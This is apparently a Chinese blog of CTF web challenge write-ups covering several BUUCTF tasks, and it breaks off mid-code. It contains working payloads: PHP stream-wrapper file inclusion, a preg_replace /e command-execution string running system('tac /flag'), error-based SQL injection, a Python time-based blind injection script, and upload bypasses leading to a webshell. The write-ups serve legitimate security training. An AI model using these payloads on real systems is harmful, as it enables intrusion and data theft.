<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flag</span>&#123;  </span><br><span class="line">    public $file=<span class="string">&quot;php://filter/resource=flag.php&quot;</span>;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new Flag;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后<code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665575036802-afb739f4-050f-41a9-9c72-a3a973bd6500.png#averageHue=%23fcfcfb&clientId=ub4f9a4f6-63c9-4&from=paste&height=316&id=u2bcc25a7&name=image.png&originHeight=395&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9652&status=done&style=none&taskId=u659882c2-9f96-4405-9b33-4f429c3623b&title=&width=548" alt="image.png"></p>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>怎么说呢？确实不过如此？咳咳题目还是有难度的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这边儿一眼就知道用data先传参然后读取next.php看看<br><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code>,读出来为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正则表达式<br>这边得先介绍一下这个<code>\\1</code>是什么意思，两个转义省掉一个就是<code>\1</code>在preg_replace中等价于<code>$&#123;1&#125;或者说是$1</code>，<code>$&#123;1&#125;</code>表示什么呢，表示第一个被替换掉的内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665582172585-846633b8-089a-4800-b7a4-4cd88b7164ed.png#averageHue=%23f9f9f8&clientId=ub4f9a4f6-63c9-4&from=paste&height=306&id=u039f39aa&name=image.png&originHeight=383&originWidth=1118&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28092&status=done&style=none&taskId=u2427c931-b604-4335-bfeb-4fdef4ee26f&title=&width=894.4" alt="image.png"><br>然后注意正则表达式哪里的e模式，这个代表可以命令执行，也就是说<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>等价于<code>eval(&#39;strtolower(&quot;\\1&quot;)&#39;)</code><br>这边就有机可乘了，接下来我再演示几组数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var_dump(phpinfo()); // 结果：布尔 true</span><br><span class="line">var_dump(strtolower(phpinfo()));// 结果：字符串 &#x27;1&#x27;</span><br><span class="line">var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;1&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 结果：字符串&#x27;11&#x27;</span><br><span class="line"></span><br><span class="line">var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 结果：空字符串&#x27;&#x27;</span><br><span class="line">var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 结果：空字符串&#x27;&#x27;</span><br><span class="line">这里的&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;执行后相当于 strtolower(&quot;&#123;$&#123;1&#125;&#125;&quot;) 又相当于 strtolower(&quot;&#123;null&#125;&quot;) 又相当于 &#x27;&#x27; 空字符串</span><br></pre></td></tr></table></figure>
<p>第三个为什么为11，因为在<code>.*</code>模式下，preg_replace会进行两次替换，猜测可能是因为*可以表示匹配0次的意思吧，我个人理解你是这样的，这地方很玄幻的，我这里本地试了很多次，<code>\0和\1</code>都可以表示<code>&#123;$&#123;phpinfo()&#125;&#125;</code>(在.*模式下)，在正常模式下<code>\0</code>表示被判断的字符串，<code>\1</code>表示被匹配的第一个字符串</p>
<p>还有个坑就是<code>&#39;&#123;$&#123;phpinfo()&#125;&#125;&#39;</code>和<code>&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;</code>是不同的，双引号包裹会解析变量，而单引号不会</p>
<p>所以最后这里的’strtolower(“{${phpinfo()}}”)’执行后相当于 strtolower(“{${1}}”) 又相当于 strtolower(“{null}”) 又相当于 ‘’ 空字符串<br>${1}是null的原因是没有名字为1的变量</p>
<p>总而言之最后就命令执行了，所以最终payload：<br><code>?text=data://text/plain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;tac /flag&#39;);</code></p>
<p>fla</p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665585704801-f0a84826-3d0b-4017-9a4e-86753ce2a9c3.png#averageHue=%23050404&clientId=ucbfa3ad0-74b0-4&from=paste&height=176&id=u647894d1&name=image.png&originHeight=220&originWidth=1414&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104800&status=done&style=none&taskId=u0428db5b-df6f-4e3f-aabc-1a89da089b4&title=&width=1131.2" alt="image.png"><br>？？？？？？？？？？？？？为什么全是它<br>这边直接上结论了，ban了and，空格（任何替代都不可以），sleep，等于号，这题用报错注入<br>payload<br><code>?username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password),0x7e)from(information_schema.columns)where</code>table_name<code>like&#39;H4rDsq1&#39;)),1))%23&amp;password=1</code><br>输入完后会发现只有一半的flag，是回显有长度限制：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665586078110-ad2f9246-cabc-463e-b6cd-ac90c4feeb63.png#averageHue=%231a1919&clientId=ucbfa3ad0-74b0-4&from=paste&height=327&id=ue21c82f6&name=image.png&originHeight=409&originWidth=1414&originalType=binary&ratio=1&rotation=0&showTitle=false&size=140836&status=done&style=none&taskId=uc6a66610-e0d8-4c75-a555-c3e25bc4a58&title=&width=1131.2" alt="image.png"><br>我们要用right函数去截取另一半：<br><code>?username=1%27or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from</code>H4rDsq1<code>),20)),0x7e),1))%23&amp;password=1</code><br>g{0e44ea8c-9e9a-4274-b<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665585796192-9f6696eb-a0aa-4108-bee2-3d741fbb669d.png#averageHue=%23191919&clientId=ucbfa3ad0-74b0-4&from=paste&height=396&id=u101e1606&name=image.png&originHeight=495&originWidth=1714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=200681&status=done&style=none&taskId=u692a083e-d15e-45bb-a7df-5abeefcf990&title=&width=1371.2" alt="image.png"></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665588229100-88cb543b-ee5c-4905-bf5d-3acb4feb28c8.png#averageHue=%23fcfcfb&clientId=u3babf027-f473-4&from=paste&height=238&id=ub7e189e0&name=image.png&originHeight=298&originWidth=1154&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19514&status=done&style=none&taskId=u663902c0-0002-4984-9670-15284b83536&title=&width=923.2" alt="image.png"><br>就只说说思路，思路是不能上传php后缀名，可以上传png，文件头验证，上传.user.ini最后解析<br>内容不能有<code>&lt;?</code>这一点用短标签绕过即可</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">  <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">          <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input firs</span><br></pre></td></tr></table></figure>

<p>就一个强碰撞数组绕过和一个1234567a<br>啊这容易：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665588604947-677cc12e-1e1f-4214-a665-82b67fad0705.png#averageHue=%23f5f1f0&clientId=u3babf027-f473-4&from=paste&height=100&id=u56d38572&name=image.png&originHeight=125&originWidth=659&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10911&status=done&style=none&taskId=u640fc1ff-e21c-4514-b39b-b845cda5154&title=&width=527.2" alt="image.png"></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665640626360-86a23b35-13cc-4d0b-b38d-4e8031d13227.png#averageHue=%23fcfcfc&clientId=ud4be9c06-eae2-4&from=paste&height=185&id=uf71d241b&name=image.png&originHeight=231&originWidth=474&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3867&status=done&style=none&taskId=u80726051-51e6-441b-9181-82f38b9a62a&title=&width=379.2" alt="image.png"><br>一个输入框，输入一串数字后就跳转：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665640643285-d54738c3-7c6e-4f27-8045-b29e55abcd26.png#averageHue=%23919191&clientId=ud4be9c06-eae2-4&from=paste&height=570&id=u8dac7c28&name=image.png&originHeight=713&originWidth=1520&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48146&status=done&style=none&taskId=u7e12a134-b193-4415-86e6-b10ff642eb7&title=&width=1216" alt="image.png"><br>这边提示wrong pass就说明有admin，经过一系列的fuzz，发现ban掉了括号，or<br>留下来union和and，这里我们用union进行注入，这一题是没有回显的，但是我们要知道union一个特性：<br>假如现在我本地有一张表结构如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665640806155-77d2b9f5-fdd2-4ecd-bc5c-564e9e0952c8.png#averageHue=%23f0f0f0&clientId=ud4be9c06-eae2-4&from=paste&height=96&id=u2325ac36&name=image.png&originHeight=120&originWidth=599&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20327&status=done&style=none&taskId=u9ee88c74-ae3e-40f9-ba2b-958fb3b50ff&title=&width=479.2" alt="image.png"><br>假如我查询一个不存在的字段再加上union：<br><code>SELECT * FROM db1.tb1 WHERE id=3 UNION SELECT 1,2,3,4 </code><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665640871918-34ad983d-df62-40c5-a354-8dcf95200683.png#averageHue=%23fcfcfc&clientId=ud4be9c06-eae2-4&from=paste&height=410&id=uddb90eff&name=image.png&originHeight=513&originWidth=777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43717&status=done&style=none&taskId=ua0388763-1fd6-475d-8a7a-929087bcdd9&title=&width=621.6" alt="image.png"><br>这样第一行的数据全部被后面覆盖了，所以我们可以利用这一点去写这一题<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665640915737-7e01f22c-78bd-43c9-bcd4-fe9aa4809fad.png#averageHue=%23f9f8f8&clientId=ud4be9c06-eae2-4&from=paste&height=92&id=u5199db3f&name=image.png&originHeight=115&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6404&status=done&style=none&taskId=uc977f735-4546-4e9f-825d-e7863eece3e&title=&width=774.4" alt="image.png"><br>源码有这一段提示，BASE64解密一次出不来，应该还加入了base32,base32+base64各解密一次得出：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665640953719-c88f758b-5138-4eff-991f-be674e31bf6d.png#averageHue=%23fbfbfa&clientId=ud4be9c06-eae2-4&from=paste&height=282&id=uc2bf7a6c&name=image.png&originHeight=352&originWidth=905&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31780&status=done&style=none&taskId=uf1deab6a-d1b8-4f34-9054-0feb96865ca&title=&width=724" alt="image.png"><br>我们payload：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665641007003-5646893d-5a22-46cb-88cf-e25dbec9b8c9.png#averageHue=%23929292&clientId=ud4be9c06-eae2-4&from=paste&height=597&id=u6fa5450c&name=image.png&originHeight=746&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46353&status=done&style=none&taskId=udf44c03b-2518-4b15-a7c4-4ccf4b47dff&title=&width=822.4" alt="image.png"><br>可以知道第二个字段就是username，因为我们第二个数据放的是admin，它显示wrong pass就说明存在这个用户，第三个字段就是password，但是这边确不正确是为什么呢？<br>可能是我们传参pw的时候，他后台进行了一些加密<br>比如<code>md5(pw)==password</code>也就是经过了md5加密，所以我们更改一下payload：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665641093013-d2621cdf-f874-418b-b45a-b988e7db47a1.png#averageHue=%23959595&clientId=ud4be9c06-eae2-4&from=paste&height=582&id=ud21bdc52&name=image.png&originHeight=727&originWidth=1199&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56125&status=done&style=none&taskId=ua0f00cce-cdb6-48d3-894a-75fef63520b&title=&width=959.2" alt="image.png"><br>这样就出来了，把3进行md5加密一下就好</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665643016505-5678f74c-46ba-4560-bafb-e081a136d4eb.png#averageHue=%23ebd39f&clientId=u01cf76e3-e905-4&from=paste&height=87&id=u6afb427b&name=image.png&originHeight=109&originWidth=973&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11997&status=done&style=none&taskId=u881e52a7-b9bb-4f1d-8651-68233fdfbd4&title=&width=778.4" alt="image.png"><br>文件上传题，也就说一下思路，经过测试<br>只可以上传jpg文件，内容有过滤，短标签绕过<br>之后上传htaccess解析jpg文件<br>最后蚁剑上号</p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>就是强网杯随便注的变种，用hanlder</p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>ban了<code>or,and,union</code>，直接用if盲注跑，这里不可以用布尔盲注啊记得，因为有线程限制，太快会429，脚本：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"># <span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://682b934a-0e36-4e28-8194-1339ca96f941.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:f<span class="string">&quot;if(ascii(substr((select\tflag\tfrom\tflag),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.5),0)&quot;</span>&#125;</span><br><span class="line">        t1=time.time()</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        # print(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> (t2-t1)&gt;<span class="number">0.8</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="title function_">print</span><span class="params">(result)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>多跑几遍，可能会有点误差</p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="title function_">include</span><span class="params">(<span class="string">&quot;flag.php&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span> &#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">process</span><span 